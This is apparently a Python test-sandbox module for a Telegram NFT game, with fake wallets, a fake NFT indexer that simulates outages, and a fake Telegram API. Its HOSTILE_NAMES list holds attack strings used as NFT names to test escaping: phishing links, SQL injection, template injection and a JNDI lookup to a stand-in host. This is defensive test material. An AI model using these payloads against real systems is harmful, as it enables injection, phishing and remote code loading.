"""A sandbox: the whole game, wired to fakes, with nothing real behind it.

Everything a full-cycle simulation needs and nothing a deployment could reach:

* **Wallets** are real ed25519 keypairs, so a signature is a real signature and
  the verification path under test is the production one. The keys are
  generated in memory, used once and thrown away.
* **The chain** is a dictionary. It can hand out NFTs, take them away
  mid-session, go down, and come back -- which are the four things a real
  indexer does and the four the game has to survive.
* **Telegram** is a queue. Updates go in, actions come out, and every message
  the bot would have sent is kept for inspection.

## Why this lives in `tools/` and not in the package

It must not be importable by a deployment. `FakeWalletProvider` is deliberately
not registered in the plugin registry for the same reason -- a fake that can be
selected by a stray environment variable is a fake that will be, eventually, in
production. Keeping the sandbox outside the installed package makes that
impossible rather than merely unlikely.

Nothing here is a secret. The "tokens" are structurally valid and
cryptographically real, and they authenticate against nothing but this process.
"""

from __future__ import annotations

import sys
import threading
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Mapping, Sequence

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from nacl import signing  # noqa: E402

from rivalforge.auth.audit import AuditTrail, InMemoryAuditSink  # noqa: E402
from rivalforge.auth.challenge import ChallengeService  # noqa: E402
from rivalforge.auth.service import WalletService  # noqa: E402
from rivalforge.auth.session import SessionService  # noqa: E402
from rivalforge.auth.session_store import InMemorySessionStore  # noqa: E402
from rivalforge.auth.store import InMemoryChallengeStore  # noqa: E402
from rivalforge.cli.wiring import Application  # noqa: E402
from rivalforge.content.loader import load_content  # noqa: E402
from rivalforge.engine.rng import RNG  # noqa: E402
from rivalforge.plugins.ports import OwnedNFT, OwnershipResult  # noqa: E402
from rivalforge.plugins.toggles import Toggles  # noqa: E402
from rivalforge.security.validation import b58encode  # noqa: E402
from rivalforge.telegram.handlers import BotHandlers  # noqa: E402
from rivalforge.telegram.security import CallbackSigner, RateLimiter  # noqa: E402
from rivalforge.telegram.state import StateStore  # noqa: E402

__all__ = [
    "SandboxWallet",
    "SandboxClock",
    "SandboxChain",
    "SandboxTelegram",
    "Sandbox",
    "build_sandbox",
    "NAME_POOL",
    "HOSTILE_NAMES",
]


# --------------------------------------------------------------------------
# Wallets
# --------------------------------------------------------------------------


class SandboxWallet:
    """A real ed25519 keypair standing in for a player's wallet.

    Real, because a fake signature would test a fake verifier. The private key
    exists for microseconds and never leaves this process.
    """

    __slots__ = ("_key", "address")

    def __init__(self, seed: bytes) -> None:
        if len(seed) != 32:
            raise ValueError("an ed25519 seed is 32 bytes")
        self._key = signing.SigningKey(seed)
        self.address = b58encode(bytes(self._key.verify_key))

    def sign(self, message: str) -> str:
        return b58encode(self._key.sign(message.encode("utf-8")).signature)

    def garbage_signature(self) -> str:
        """A well-formed but wrong signature. What a phishing victim would send."""
        return b58encode(b"\x00" * 64)


def make_wallets(count: int) -> list[SandboxWallet]:
    return [SandboxWallet(index.to_bytes(4, "big") + b"\x00" * 28) for index in range(1, count + 1)]


# --------------------------------------------------------------------------
# Clock
# --------------------------------------------------------------------------


class SandboxClock:
    """A clock the simulation drives, so expiry can be tested in milliseconds.

    Against the real clock, a session-expiry test either takes an hour or does
    not test expiry.
    """

    __slots__ = ("_now", "_lock")

    def __init__(self, start: datetime | None = None) -> None:
        self._now = start or datetime(2026, 9, 7, 12, 0, tzinfo=timezone.utc)
        self._lock = threading.Lock()

    def now(self) -> datetime:
        with self._lock:
            return self._now

    def advance(self, **kwargs: float) -> None:
        with self._lock:
            self._now = self._now + timedelta(**kwargs)


# --------------------------------------------------------------------------
# The chain
# --------------------------------------------------------------------------

#: Ordinary names, the kind most NFTs actually have.
NAME_POOL = (
    "Solstice Ape #{n}", "Void Band #{n}", "Neon Koi #{n}", "Rust Warden #{n}",
    "Glass Monk #{n}", "Pale Comet #{n}", "Iron Sparrow #{n}", "Ash Diver #{n}",
)

#: Names that are attacks. Each one is a few cents to mint on a real chain,
#: which is the entire reason the escaping layer exists.
HOSTILE_NAMES = (
    "[Claim your airdrop](https://evil.example)",
    "*Verified* `admin`",
    "```\nnot the end\n```",
    "connect wallet at https://evil.example to claim",
    "a‮exe.gnp",                      # right-to-left override
    "zero​width‍joiner",
    "​​​",                  # nothing printable at all
    "Z" * 5000,                            # push the message off the screen
    "name\nwith\nnewlines",
    "'; DROP TABLE players; --",
    "{{7*7}} ${jndi:ldap://evil}",
)


@dataclass
class SandboxChain:
    """A fake NFT indexer that can also fail like a real one.

    Three failure modes, because these are the three that matter:

    * **outage** -- the answer is "we could not check", not "you do not own it";
    * **sold** -- the holdings change between one match and the next;
    * **slow** -- not simulated as latency, but as the timeout the caller sees.
    """

    holdings: dict[str, list[OwnedNFT]] = field(default_factory=dict)
    outage_rate: float = 0.0
    hard_down: bool = False
    name: str = "sandbox-chain"

    calls_verify: int = 0
    calls_list: int = 0
    outages_served: int = 0
    _rng: RNG = field(default_factory=lambda: RNG(0xC0FFEE))
    _lock: threading.Lock = field(default_factory=threading.Lock)

    # -- the port ---------------------------------------------------------

    def verify_ownership(self, wallet: str, mint: str) -> OwnershipResult:
        with self._lock:
            self.calls_verify += 1
            if self._down():
                self.outages_served += 1
                return OwnershipResult.unavailable("indexer unavailable")
            held = {n.mint for n in self.holdings.get(wallet, ())}
        return OwnershipResult.owned() if mint in held else OwnershipResult.not_owned()

    def list_owned(self, wallet: str, *, limit: int = 100) -> Sequence[OwnedNFT]:
        with self._lock:
            self.calls_list += 1
            if self._down():
                self.outages_served += 1
                raise RuntimeError("indexer unavailable")
            return tuple(self.holdings.get(wallet, ()))[:limit]

    def _down(self) -> bool:
        return self.hard_down or (
            self.outage_rate > 0 and self._rng.chance(self.outage_rate)
        )

    # -- the simulation's controls ---------------------------------------

    def give(self, wallet: str, nft: OwnedNFT) -> None:
        with self._lock:
            self.holdings.setdefault(wallet, []).append(nft)

    def sell_everything(self, wallet: str) -> int:
        """The case that makes cached ownership a bug."""
        with self._lock:
            sold = len(self.holdings.get(wallet, ()))
            self.holdings[wallet] = []
            return sold


def mint_for(wallet: str, index: int) -> str:
    """A deterministic, structurally valid mint address for a fake NFT."""
    material = RNG.from_bytes(f"{wallet}:{index}".encode("utf-8"))
    return b58encode(bytes(material.below(256) for _ in range(32)))


def stock_wallet(
    chain: SandboxChain, wallet: str, count: int, rng: RNG, *, hostile_share: float = 0.25
) -> list[OwnedNFT]:
    """Fill a wallet with NFTs, a quarter of them named as attacks."""
    minted = []
    for index in range(count):
        if rng.chance(hostile_share):
            name = rng.choice(HOSTILE_NAMES)
        else:
            name = rng.choice(NAME_POOL).replace("{n}", str(rng.below(9999)))
        nft = OwnedNFT(mint=mint_for(wallet, index), name=name, collection=None)
        chain.give(wallet, nft)
        minted.append(nft)
    return minted


# --------------------------------------------------------------------------
# Telegram
# --------------------------------------------------------------------------


class SandboxTelegram:
    """A Bot API that keeps everything instead of sending it.

    Also the place transport failure is injected: `fail_next` makes the next
    send raise, which is how the loop's "one player's failed reply must not
    stop the others" property gets exercised.
    """

    def __init__(self) -> None:
        self.pending: list[Mapping[str, Any]] = []
        self.sent: list[tuple[int, str, Any]] = []
        self.edited: list[tuple[int, int, str, Any]] = []
        self.answered: list[tuple[str, str]] = []
        self.fail_next = 0
        self.send_failures = 0
        self._lock = threading.Lock()

    # -- what `Bot` calls -------------------------------------------------

    def get_me(self) -> Mapping[str, Any]:
        return {"id": 1, "username": "SandboxBot"}

    def delete_webhook(self) -> None:
        pass

    def get_updates(self, offset=None, *, poll_seconds=None):
        with self._lock:
            batch, self.pending = self.pending, []
        return batch

    def send_message(self, chat_id, text, *, keyboard=None):
        self._maybe_fail()
        with self._lock:
            self.sent.append((chat_id, text, keyboard))
            return {"message_id": len(self.sent) + len(self.edited)}

    def edit_message_text(self, chat_id, message_id, text, *, keyboard=None):
        self._maybe_fail()
        with self._lock:
            self.edited.append((chat_id, message_id, text, keyboard))

    def answer_callback_query(self, callback_id, *, text="", alert=False):
        with self._lock:
            self.answered.append((callback_id, text))

    def _maybe_fail(self) -> None:
        with self._lock:
            if self.fail_next > 0:
                self.fail_next -= 1
                self.send_failures += 1
                raise RuntimeError("simulated transport failure")

    # -- what the simulation calls ---------------------------------------

    def deliver(self, update: Mapping[str, Any]) -> None:
        with self._lock:
            self.pending.append(update)

    @property
    def messages(self) -> list[str]:
        """Every piece of text the bot has produced, sent or edited."""
        with self._lock:
            return [t for _, t, _ in self.sent] + [t for _, _, t, _ in self.edited]

    @property
    def keyboards(self) -> list[Any]:
        with self._lock:
            return [k for _, _, k in self.sent] + [k for _, _, _, k in self.edited]


# --------------------------------------------------------------------------
# Assembly
# --------------------------------------------------------------------------


@dataclass
class Sandbox:
    """Everything wired together, plus the handles a simulation needs."""

    app: Application
    handlers: BotHandlers
    api: SandboxTelegram
    chain: SandboxChain
    clock: SandboxClock
    signer: CallbackSigner
    states: StateStore
    audit: InMemoryAuditSink
    content: Any

    def sign(self, action: str, argument: str, user_id: int) -> str:
        return self.signer.sign(action, argument, user_id)


def build_sandbox(
    *,
    require_ownership: bool = True,
    session_ttl: timedelta = timedelta(hours=1),
    rate_capacity: int = 40,
    rate_refill: float = 20.0,
    max_users: int = 5_000,
    idle_seconds: float = 3_600.0,
    outage_rate: float = 0.0,
    opponent: str = "adaptive",
    content: Any = None,
) -> Sandbox:
    """Build a complete, self-contained game with nothing real behind it."""
    game = content if content is not None else load_content()
    clock = SandboxClock()
    chain = SandboxChain(outage_rate=outage_rate)
    audit = InMemoryAuditSink(max_records=200_000)

    app = Application(
        content=game,
        features=Toggles(
            overrides={
                "telegram_bot": True,
                "wallet_verification": require_ownership,
                "ai_agents": True,
            },
            env={},
        ),
        wallets=WalletService(
            ChallengeService(
                InMemoryChallengeStore(max_challenges=100_000, max_per_wallet=5),
                clock,
                domain="sandbox.rivalforge",
                uri="https://sandbox.rivalforge",
            ),
            SessionService(clock, store=InMemorySessionStore(), ttl=session_ttl),
            chain,
            AuditTrail(audit, clock),
            game,
            require_ownership=require_ownership,
        ),
        audit_sink=audit,
        clock=clock,
    )

    states = StateStore(max_users=max_users, idle_seconds=idle_seconds)
    signer = CallbackSigner(b"sandbox-callback-key-not-a-secret")
    handlers = BotHandlers(
        app,
        signer=signer,
        limiter=RateLimiter(capacity=rate_capacity, refill_per_second=rate_refill),
        states=states,
        opponent=opponent,
    )

    return Sandbox(
        app=app,
        handlers=handlers,
        api=SandboxTelegram(),
        chain=chain,
        clock=clock,
        signer=signer,
        states=states,
        audit=audit,
        content=game,
    )


# --------------------------------------------------------------------------
# Update builders -- the exact shapes Telegram sends
# --------------------------------------------------------------------------

_update_id = 0
_update_lock = threading.Lock()


def _next_update_id() -> int:
    global _update_id
    with _update_lock:
        _update_id += 1
        return _update_id


def text_update(
    user_id: int, text: str, *, chat_id: int | None = None, chat_type: str = "private",
    is_bot: bool = False, message_id: int = 1,
) -> dict[str, Any]:
    return {
        "update_id": _next_update_id(),
        "message": {
            "message_id": message_id,
            "from": {"id": user_id, "is_bot": is_bot, "username": f"player{user_id}"},
            "chat": {"id": chat_id if chat_id is not None else user_id, "type": chat_type},
            "text": text,
        },
    }


def button_update(
    user_id: int, data: str, *, chat_id: int | None = None, message_id: int = 1,
    callback_id: str | None = None,
) -> dict[str, Any]:
    return {
        "update_id": _next_update_id(),
        "callback_query": {
            "id": callback_id or f"cb-{_next_update_id()}",
            "from": {"id": user_id, "is_bot": False},
            "message": {
                "message_id": message_id,
                "chat": {"id": chat_id if chat_id is not None else user_id, "type": "private"},
            },
            "data": data,
        },
    }
